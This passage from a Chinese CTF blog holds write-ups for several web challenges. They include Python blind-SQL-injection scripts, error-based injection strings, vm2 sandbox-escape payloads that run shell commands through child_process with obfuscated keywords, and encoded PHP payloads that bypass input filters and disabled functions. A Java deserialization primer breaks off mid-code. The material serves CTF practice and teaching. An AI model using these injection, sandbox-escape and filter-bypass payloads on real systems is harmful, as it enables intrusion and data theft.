<p>进去先看版本，发现是thinkphp6.0，搜一下CVE，发现有这么一个漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;god_zzZ&#x2F;article&#x2F;details&#x2F;104275241?utm_medium&#x3D;distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm&#x3D;1001.2101.3001.4242</span><br></pre></td></tr></table></figure>

<p>看了看session.php的，嗯，果然滿足利用条件的环境</p>
<p><img src="image-20210325171916063.png" alt="image-20210325171916063"></p>
<p>那么根据作者给出的条件，我们需要再找一个地方，利用到了session函数且值可控，很快就可以找到再这里：</p>
<p><img src="image-20210325172126374.png" alt="image-20210325172126374"></p>
<p>那么利用也很简单了，根据给出的利用方式构造即可：</p>
<p><img src="image-20210325172156904.png" alt="image-20210325172156904"></p>
<p>之后的绕过限制可以用蚁剑一键跑就行。</p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>CVE</tag>
        <tag>ThinkPHP</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020Ezsqli</title>
    <url>/2020/11/19/GYCTF2020Ezsqli/</url>
    <content><![CDATA[<h1 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h1><p>盲注，无列名注入。一样的尝试构造注入语句之后：</p>
<p>这里利用了网站的特性，当条件成立的时候返回NU1l,失败的时候，就是V&amp;N</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &quot;id=if(ascii(  substr( database() ,1,1)  )&gt;100,1,2)#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stringlist = string.digits + string.ascii_letters</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="comment"># for j in stringlist:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">126</span>):</span><br><span class="line">        sql = <span class="string">&quot;if(ascii(  substr( database() ,&#123;&#125;,1)  )&gt;&#123;&#125;,1,2)#&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: sql&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;V&amp;N&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(j)</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>注入得到表名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">givf_grasdpa_pa_pa_pa</span><br></pre></td></tr></table></figure>

<p>之后进一步却很难了，因为我们不知道该怎么查询东西，因为information_schmea被过滤掉了，故只能考虑其他注入，分别尝试对innob和sys库进行注入，挨个尝试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">sys.schema_auto_increment_columns </span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_flattened_keys</span><br></pre></td></tr></table></figure>

<p>构造语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>

<p>注入表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sql =<span class="string">&quot;if(ascii(  substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()  ),&#123;&#125;,1)  )&gt;&#123;&#125;,1,2)#&quot;</span>.<span class="built_in">format</span>(i, j) <span class="comment"># 数据表</span></span><br></pre></td></tr></table></figure>

<p>得到结果:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">users233333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>

<p>但是之后我们因为被过滤了or无法获取自动的名字，只能进行无列名注入的操作了</p>
<p>首先学习了一波师傅的思路：</p>
<p>利用ascii位的偏移，在本地进行尝试</p>
<p><img src="image-20201119145415713.png" alt="image-20201119145415713"></p>
<p>这里需要注意的是 如果select b &gt;select a，如果select b &gt; select a返回的0</p>
<p>之后还可以进一步的去构造拼接：</p>
<p><img src="image-20201119145730124.png" alt="image-20201119145730124"></p>
<p>那么也就是说我们构造出flag之后一步一步的位移推算即可</p>
<p>这里贴上师傅的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res += flag</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        hexchar = add(flag + <span class="built_in">chr</span>(char))</span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>除此之外还有二分法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;</span></span><br><span class="line"><span class="comment">#give_grandpa_pa_pa_pa</span></span><br><span class="line"></span><br><span class="line">payload_flag=<span class="string">&#x27;1^((1,\&#x27;&#123;&#125;\&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">132</span></span><br><span class="line">    mid = (low + high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        k = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">        payload = payload_flag.<span class="built_in">format</span>(k)</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        print(payload)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low+high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid ==<span class="number">33</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=<span class="built_in">chr</span>(mid<span class="number">-1</span>)</span><br><span class="line">    print(flag.lower())<span class="comment">#因为出来的flag是大写，这边全部转为小写</span></span><br><span class="line">    </span><br><span class="line">print(flag.lower())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="记一下报错注入"><a href="#记一下报错注入" class="headerlink" title="记一下报错注入"></a>记一下报错注入</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;fl4g&#x27;</span>  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>HFCTF2020JustEscape</title>
    <url>/2020/12/17/HFCTF2020JustEscape/</url>
    <content><![CDATA[<p>一道VM2的沙箱逃逸..</p>
<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
<li>沙箱逃逸</li>
<li>Payload拼接(?)</li>
</ul>
<h1 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h1><p>这道题目伪装成PHP是真滴恶心，首先我们访问可以得到一个用Vue框架写的页面：</p>
<p><img src="image-20201217143745895.png" alt="image-20201217143745895"></p>
<p>尝试直接访问index.php的话可以得到一段php源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;code&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;code&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果你就会发现这个code是没加$符号的也就是说他没用..那么再回到之前的code的部分，大概也是真的eval了这段代码，看看是不是Javascript</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?code=<span class="built_in">Error</span>().stack</span><br></pre></td></tr></table></figure>



<p><img src="image-20201217144354519.png" alt="image-20201217144354519"></p>
<p>果然是JS，而且我们可以知道是VM2的沙箱，那么如何沙箱逃逸呢？👴一点JS也不懂，没法子只能去GITHUB上嫖，找到：</p>
<p><a href="https://github.com/patriksimek/vm2/issues/225">vm2沙箱逃逸</a>，可以看到：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="function"><span class="title">catch</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尝试复制粘贴【</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>

<p>好的打不过，倒地只能看WP了，别人给出的POC：</p>
<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC 1"></a>POC 1</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>呃..?这里看起来是进行了拼接，自己不懂原理的话就先学会怎么拼接payload吧,在JS中我们可以用反引号来代替单引号和双引号：</p>
<h3 id="的语法"><a href="#的语法" class="headerlink" title="`的语法"></a>`的语法</h3><p>ES6 模板字符串(Template String)是增强版的字符串，用反引号(`)标识，它可以当作普通字符串使用，也可以用来定义多行字符串，或者在字符串中嵌入变量。<a href="https://www.cnblogs.com/alummox/p/11343269.html">介绍博客</a>,从此处我们可以得到反引号作用：</p>
<ul>
<li>代替字符串的双引号和单引号</li>
<li>可以包含特定语法的占位符</li>
<li>配合${}符号可以包含变量</li>
</ul>
<p>例子：</p>
<p>原本我们输出多行字符串应该这样来写：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;string text line 1\n&#x27;</span> +</span><br><span class="line"><span class="string">&#x27;string text line 2&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>使用反引号之后:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">`string text line 1</span></span><br><span class="line"><span class="string">string text line 2`</span>);</span><br></pre></td></tr></table></figure>

<p><img src="image-20201217151045490.png" alt="image-20201217151045490"></p>
<p>当其与${}搭配之后更是可以大大降低我们书写字符串的格式化问题：</p>
<p><img src="image-20201217151200088.png" alt="image-20201217151200088"></p>
<p>那么现在回到题目来，我们需要拼接变量该如何操作呢？很简单，只需要先用反引号将需要的东西包含起来，再用${}即可表示为一个变量：</p>
<p><img src="image-20201217151634833.png" alt="image-20201217151634833"></p>
<h3 id="的语法-1"><a href="#的语法-1" class="headerlink" title="[]的语法"></a>[]的语法</h3><p>如果不允许我们使用点号，我们可以使用[]来绕过：<a href="https://blog.csdn.net/qq_39125684/article/details/80327218">JS中的中括号</a></p>
<p>这样的话我们就可以任意的绕过关键参数匹配，拼接出上图的Payload了</p>
<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC 2"></a>POC 2</h2><p>利用join来拼接字符串：</p>
<h3 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function">()=&gt;</span>&#123; <span class="built_in">TypeError</span>[[<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`y`</span>,<span class="string">`p`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)][<span class="string">`a`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[[<span class="string">`c`</span>,<span class="string">`o`</span>,<span class="string">`n`</span>,<span class="string">`s`</span>,<span class="string">`t`</span>,<span class="string">`r`</span>,<span class="string">`u`</span>,<span class="string">`c`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`r`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`t`</span>,<span class="string">`u`</span>,<span class="string">`r`</span>,<span class="string">`n`</span>,<span class="string">` `</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))(); <span class="keyword">try</span>&#123; <span class="built_in">Object</span>[<span class="string">`preventExtensions`</span>](Buffer[<span class="string">`from`</span>](<span class="string">``</span>))[<span class="string">`a`</span>] = <span class="number">1</span>; &#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123; <span class="keyword">return</span> e[<span class="string">`a`</span>](<span class="function">()=&gt;</span>&#123;&#125;)[<span class="string">`mainModule`</span>][[<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`q`</span>,<span class="string">`u`</span>,<span class="string">`i`</span>,<span class="string">`r`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`c`</span>,<span class="string">`h`</span>,<span class="string">`i`</span>,<span class="string">`l`</span>,<span class="string">`d`</span>,<span class="string">`_`</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))[[<span class="string">`e`</span>,<span class="string">`x`</span>,<span class="string">`e`</span>,<span class="string">`c`</span>,<span class="string">`S`</span>,<span class="string">`y`</span>,<span class="string">`n`</span>,<span class="string">`c`</span>][<span class="string">`join`</span>](<span class="string">``</span>)](<span class="string">`cat /flag`</span>)[<span class="string">`toString`</span>](); &#125; &#125;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>JS当中使用join()中添加参数来决定如何拼接，如果不添加默认用,分割开来，如果为0就会拼接在一起了</p>
<h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC 3"></a>POC 3</h2><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">code[]=(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;cat /flag&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h1 id="VM2沙箱逃逸原理"><a href="#VM2沙箱逃逸原理" class="headerlink" title="VM2沙箱逃逸原理"></a>VM2沙箱逃逸原理</h1><p><a href="https://www.anquanke.com/post/id/207291">先丢在这，不敢碰我npm环境现在</a></p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>Javascirpt</tag>
        <tag>vm2沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>ISITDTU2019_EasyPHP</title>
    <url>/2021/03/26/ISITDTU2019-EasyPHP/</url>
    <content><![CDATA[<p>开局给出源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_ = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>open_basedir：限定能操作的目录</p>
<p>用这个网站测试匹配了什么：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;regex101.com&#x2F;</span><br></pre></td></tr></table></figure>

<p>这个网站就是这个好：</p>
<p><img src="image-20210326113348661.png" alt="image-20210326113348661"></p>
<p>看了大佬的WP知道这个操作，感觉很有用记下来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$array=get_defined_functions();<span class="comment">//返回所有内置定义函数</span></span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;\`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $arr) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( strlen(count_chars(strtolower($arr), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>($arr.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样的话我们就可以快速找到有哪些函数可以用了，不过这道题给出的函数并不能用。</p>
<p>那就只能取反来操作了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0f224c84-f3b8-42e4-9dd3-755cd38520eb.node3.buuoj.cn&#x2F;</span><br><span class="line">?_&#x3D;(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<p>这样就成功了,查一下disablefunction，</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,</span><br></pre></td></tr></table></figure>

<p>所有命令执行的函数都被ban了，但是我们还有PHP的原生函数:scan_dir和glob，读取文件的话可以用highlight_file()和readfile</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">想要执行的命令如下：</span><br><span class="line">print_r(scandir(.));</span><br><span class="line">show_source(end(scandir(.)));</span><br></pre></td></tr></table></figure>



<p>分别得出payload：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>





<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaSerialize</title>
    <url>/2020/11/02/JavaSerialize/</url>
    <content><![CDATA[<p>JAVA当中对于文件的处理都是通过IO流进行操作的</p>
<h1 id="一些IO流的API"><a href="#一些IO流的API" class="headerlink" title="一些IO流的API"></a>一些IO流的API</h1><ul>
<li>FileOutputStream  写入流，我们用该流可以写入内容到文件当中</li>
<li>FileInputStream   读取流</li>
<li>ObjectOutputStream 该流可以将一个对象写出，或者读取一个对象到程序中，也就是执行了序列化和反序列化操作。</li>
<li>ObjectInputStream  反序列化并打印数据</li>
</ul>
<h1 id="JAVA反序列化过程"><a href="#JAVA反序列化过程" class="headerlink" title="JAVA反序列化过程"></a>JAVA反序列化过程</h1><p>首先我们要明白，Java的序列化与反序列化的过程是如何产生的，我们可以编写如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String obj = <span class="string">&quot;ls &quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将序列化对象写入文件aa.ser中</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;aa.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// aa.ser中读取数据</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;aa.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> 